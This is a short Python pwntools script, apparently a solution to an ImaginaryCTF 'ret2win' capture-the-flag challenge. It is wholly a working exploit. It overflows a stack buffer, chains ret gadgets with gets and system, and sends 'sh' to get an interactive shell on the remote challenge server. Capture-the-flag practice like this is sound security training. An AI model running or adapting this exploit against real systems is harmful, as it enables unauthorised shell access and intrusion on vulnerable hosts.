from pwn import *
import sys

elf = ELF("vuln")

# io = process(elf.path)
io = remote("ret2win.chal.imaginaryctf.org", 1337)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io)

p = b'A' * 0x48
p += p64(next(elf.search(asm('ret'), executable=True)))
p += p64(elf.sym["gets"])
p += p64(next(elf.search(asm('ret'), executable=True)))
p += p64(elf.sym["system"])

io.sendline(p)

io.sendline(b'sh\x00AAAAAA')
io.interactive()